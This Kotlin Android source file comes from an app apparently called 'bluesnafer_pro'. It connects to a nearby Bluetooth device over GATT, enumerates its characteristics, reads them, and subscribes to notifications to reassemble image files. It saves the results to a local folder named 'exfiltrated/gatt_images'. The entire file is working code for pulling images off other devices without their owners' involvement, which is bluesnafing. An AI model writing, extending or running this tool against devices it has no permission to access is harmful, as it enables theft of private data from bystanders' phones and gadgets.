package com.bluesnafer_pro

import android.bluetooth.*
import android.util.Log
import java.io.*
import java.util.*
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

object GATTImageReader {
    private const val TAG = "GATTImageReader"
    private const val MAX_BUFFER_SIZE = 4 * 1024 * 1024 // 4 MB por canal de notify
    private val JPEG_END = byteArrayOf(0xFF.toByte(), 0xD9.toByte())
    private val PNG_IEND = byteArrayOf(
        0x49.toByte(), 0x45.toByte(), 0x4E.toByte(), 0x44.toByte(), // IEND
        0xAE.toByte(), 0x42.toByte(), 0x60.toByte(), 0x82.toByte()
    )

    private val IMAGE_MAGIC_BYTES = listOf(
        byteArrayOf(0xFF.toByte(), 0xD8.toByte()),
        byteArrayOf(0x89.toByte(), 0x50.toByte()),
        byteArrayOf(0x47.toByte(), 0x49.toByte()),
        byteArrayOf(0x52.toByte(), 0x49.toByte()),
        byteArrayOf(0x42.toByte(), 0x4D.toByte())
    )

    fun scanAndReadImages(device: BluetoothDevice, maxImages: Int = 15): Map<String, Any> {
        Log.d(TAG, "GATT image scan on ${device.address}")
        val foundImages = mutableListOf<Map<String, Any>>()
        val allCharacteristics = mutableListOf<Map<String, String>>()
        val notifyBuffers = mutableMapOf<String, ByteArray>() // uuid -> buf fragmentos de imagen (notifications)
        var gatt: BluetoothGatt? = null
        val latch = CountDownLatch(1)

        try {
            val callback = object : BluetoothGattCallback() {
                override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
                    if (newState == BluetoothProfile.STATE_CONNECTED) {
                        Log.d(TAG, "GATT connected; MTU lo negocia el stack Android (no expone requestMtu).")
                        gatt.discoverServices()
                    } else if (newState == BluetoothProfile.STATE_DISCONNECTED) {
                        latch.countDown()
                    }
                }

                override fun onMtuChanged(gatt: BluetoothGatt, mtu: Int, status: Int) {
                    Log.d(TAG, "MTU negociado por el stack Android: $mtu (status=$status)")
                }

                override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
                    if (status == BluetoothGatt.GATT_SUCCESS) {
                        for (service in gatt.services) {
                            for (char in service.characteristics) {
                                val uuid = char.uuid.toString()
                                val props = char.properties
                                val isReadable = (props and BluetoothGattCharacteristic.PROPERTY_READ) != 0
                                val isNotify = (props and BluetoothGattCharacteristic.PROPERTY_NOTIFY) != 0
                                val isWrite = (props and BluetoothGattCharacteristic.PROPERTY_WRITE) != 0

                                val mime = try {
                                    val valStr = String(char.value ?: byteArrayOf()).take(128)
                                    if (valStr.contains("image/")) valStr.substringBefore(";").trim()
                                    else if (IMAGE_MAGIC_BYTES.any { valStr.contains(it.joinToString("")) }) valStr.substringBefore(";").trim()
                                    else ""
                                } catch (_: Exception) { "" }

                                allCharacteristics.add(
                                    mapOf(
                                        "service" to service.uuid.toString(),
                                        "characteristic" to uuid,
                                        "readable" to isReadable.toString(),
                                        "notify" to isNotify.toString(),
                                        "write" to isWrite.toString(),
                                        "mimeHint" to mime,
                                        "valueSize" to (char.value?.size ?: 0).toString()
                                    )
                                )

                                if (isReadable && mime.isNotEmpty() && foundImages.size < maxImages) {
                                    try {
                                        gatt.readCharacteristic(char)
                                    } catch (_: Exception) {}
                                }

                                // Receta #6: suscribirse a notifications para imagenes que llegan por tramos
                                if (isNotify) {
                                    try {
                                        gatt.setCharacteristicNotification(char, true)
                                    } catch (_: Exception) {}
                                    if (!notifyBuffers.containsKey(uuid)) {
                                        notifyBuffers[uuid] = byteArrayOf()
                                    }
                                }
                            }
                        }
                    }
                }

                override fun onCharacteristicRead(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, status: Int) {
                    if (status == BluetoothGatt.GATT_SUCCESS) {
                        val value = characteristic.value ?: return
                        if (value.size < 4) return
                        persistImage(value, characteristic.uuid.toString(), foundImages, maxImages)
                    }
                }

                override fun onCharacteristicChanged(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, value: ByteArray) {
                    val uuidBytes = characteristic.uuid.toString()
                    val prev = notifyBuffers[uuidBytes] ?: byteArrayOf()
                    val buf = prev + value
                    if (buf.size > MAX_BUFFER_SIZE) {
                        notifyBuffers.remove(uuidBytes)
                        return
                    }
                    notifyBuffers[uuidBytes] = buf
                    if (foundImages.size >= maxImages) return
                    if (!IMAGE_MAGIC_BYTES.any { mag ->
                        buf.size >= mag.size && buf.take(mag.size).toByteArray() contentEquals mag
                    }) return
                    if (isCompleteImage(buf)) {
                        persistImage(buf, uuidBytes, foundImages, maxImages)
                        notifyBuffers.remove(uuidBytes)
                    }
                }
            }

            gatt = device.connectGatt(null, false, callback)
            if (!latch.await(20, TimeUnit.SECONDS)) {
                Log.w(TAG, "GATT image scan timeout")
            }

            return mapOf(
                "success" to foundImages.isNotEmpty(),
                "images" to foundImages,
                "imagesCount" to foundImages.size,
                "totalBytes" to foundImages.fold(0L) { acc, img -> acc + ((img["size"] as? Long ?: 0)) },
                "characteristicsScanned" to allCharacteristics.size,
                "method" to "gatt_image_read",
                "message" to if (foundImages.isNotEmpty()) "GATT image read: ${foundImages.size} imagenes encontradas" else "GATT: no se encontraron imagenes en characteristics"
            )
        } catch (e: Exception) {
            Log.e(TAG, "GATT image read error: ${e.message}")
            return mapOf("success" to false, "error" to (e.message ?: "unknown error"), "method" to "gatt_image_read")
        } finally {
            try { gatt?.close() } catch (_: Exception) {}
        }
    }

    // ── Helpers de imagen (reutilizados por read + notifications) ─────────────

    private fun hasSuffix(buf: ByteArray, tail: ByteArray): Boolean {
        if (buf.size < tail.size) return false
        for (i in 0 until tail.size) if (buf[buf.size - tail.size + i] != tail[i]) return false
        return true
    }

    /** Detecta si el buffer ya representa una imagen "completa" (EOF del formato). */
    private fun isCompleteImage(buf: ByteArray): Boolean {
        if (buf.size < 8) return false
        return hasSuffix(buf, JPEG_END) || hasSuffix(buf, PNG_IEND) || buf[buf.size - 1].toInt() == 0x3B
    }

    private fun guessMime(value: ByteArray): String {
        if (value.size >= 2 && value[0].toInt() == 0xFF && value[1].toInt() == 0xD8) return "image/jpeg"
        if (value.size >= 4 && value[0].toInt() == 0x89 && value[1].toInt() == 0x50) return "image/png"
        if (value.size >= 3 && value[0].toInt() == 0x47 && value[1].toInt() == 0x49) return "image/gif"
        if (value.size >= 2 && value[0].toInt() == 0x42 && value[1].toInt() == 0x4D) return "image/bmp"
        return "image/unknown"
    }

    private fun persistImage(
        value: ByteArray,
        uuidStr: String,
        foundImages: MutableList<Map<String, Any>>,
        imageLimit: Int
    ) {
        if (value.size < 4 || foundImages.size >= imageLimit) return
        val ctx = BluetoothMethodHandler.getAppContext() ?: return
        try {
            val dir = File(File(ctx.filesDir, "exfiltrated"), "gatt_images")
            dir.mkdirs()
            val mime = guessMime(value)
            val ext = when {
                mime.contains("jpeg") -> "jpg"
                mime.contains("png") -> "png"
                mime.contains("gif") -> "gif"
                mime.contains("bmp") -> "bmp"
                else -> "img"
            }
            val safeName = "gatt_${System.currentTimeMillis()}_${foundImages.size}.$ext"
            val outFile = File(dir, safeName)
            outFile.writeBytes(value)
            foundImages.add(
                mapOf(
                    "name" to safeName,
                    "size" to value.size.toLong(),
                    "localPath" to outFile.absolutePath,
                    "remotePath" to uuidStr,
                    "mimeType" to mime,
                    "characteristic" to uuidStr
                )
            )
            Log.d(TAG, "GATT image saved: $safeName (${value.size} bytes)")
        } catch (e: Exception) {
            Log.w(TAG, "GATT save failed: ${e.message}")
        }
    }
}
